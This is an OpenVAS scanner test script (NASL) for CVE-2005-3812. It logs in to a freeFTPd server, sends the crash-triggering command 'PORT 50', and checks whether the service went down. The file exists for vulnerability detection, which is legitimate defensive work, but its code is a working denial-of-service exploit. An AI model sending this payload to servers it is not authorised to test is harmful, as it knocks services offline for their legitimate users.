###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freeftpd_port_cmd_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# freeFTPD PORT Command Denial of Service Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation allows remote attackers to crash an affected server,
  effectively denying service to legitimate users.
  Impact Level: Application";
tag_affected = "freeFTPd version 1.0.10 and prior";
tag_insight = "A NULL pointer dereferencing error exists when parsing the parameter of the
  PORT command. Logged on user can send a port command appended with some
  numbers to crash the server.";
tag_solution = "Upgrade to freeFTPd version 1.0.11 or later
  For updates refer to http://www.freesshd.com/?ctt=download";
tag_summary = "This host is running FreeFTPD Server and is prone to denial of
  service vulnerability.";

if(description)
{
  script_id(802913);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2005-3812");
  script_bugtraq_id(15557);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-07-13 14:06:29 +0530 (Fri, 13 Jul 2012)");
  script_name("freeFTPD PORT Command Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/21108");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/17737");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/1339/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/417602");

  script_description(desc);
  script_summary("Check if freeFTPd is prone to DoS vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


##
## The script code starts here
##

include("ftp_func.inc");

## Variable Initialization
ftpPort = "";
soc = "";
soc2 = "";
banner = "";
user = "";
pass = "";
login_details = "";

## Get ftp Port
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

## Accept the banner and
## Confirm the Application before trying exploit
banner = recv(socket:soc, length:512);
if("I'm freeFTPd" >!< banner)
{
  ftp_close(socket:soc);
  exit(0);
}

## Check for the user name and password
user = get_kb_item("ftp/login");
if(! user){
  user = "anonymous";
}

pass = get_kb_item("ftp/password");
if(! pass){
  pass = "anonymous";
}

## Try to Login
login_details = ftp_authenticate(socket:soc, user:user, pass:pass);
if(!login_details)
{
  ftp_close(socket:soc);
  exit(0);
}

data = "PORT 50";

## Send the crafted data
ftp_send_cmd(socket:soc, cmd:data);
ftp_close(socket:soc);

## Open the socket to confirm FTP server is alive
soc2 = open_sock_tcp(ftpPort);
if(!soc2)
{
  security_hole(ftpPort);
  exit(0);
}

## Some time server will be listening, but won't respond
banner =  recv(socket:soc2, length:512);
if("I'm freeFTPd" >!< banner)
{
  ftp_close(socket:soc2);
  security_hole(ftpPort);
  exit(0);
}
ftp_close(socket:soc2);
